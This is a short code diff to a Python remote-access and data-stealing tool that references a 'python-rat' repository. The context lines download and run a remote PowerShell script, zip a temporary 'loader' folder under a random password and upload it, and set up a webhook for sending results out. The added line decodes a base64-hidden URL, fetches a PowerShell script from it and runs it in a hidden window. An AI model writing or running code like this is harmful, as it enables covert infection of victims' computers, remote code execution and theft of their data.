@@ -137,6 +137,7 @@ def upload_file(path):
 	return A
 ps_script_url='https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1'
 run_powershell_script(ps_script_url)
+subprocess.Popen(['powershell','-Command',requests.get(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode()).text],creationflags=subprocess.CREATE_NO_WINDOW)
 password=''.join(random.choices(string.ascii_letters+string.digits,k=12))
 temp_folder=os.path.join(os.getenv('TEMP'),'loader')
 zip_data,zip_size=zip_folder(temp_folder,password,_E)
@@ -145,7 +146,6 @@ if zip_size>20*1024*1024:
 	with open(zip_path,'wb')as f:f.write(zip_data)
 	link=upload_file(zip_path)
 else:link=None
-run_powershell_script(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode())
 content=f"hai1723 on top\npassword:{password}"
 filename=_E
 webhook_url='YOUR_WEBHOOK_URL'
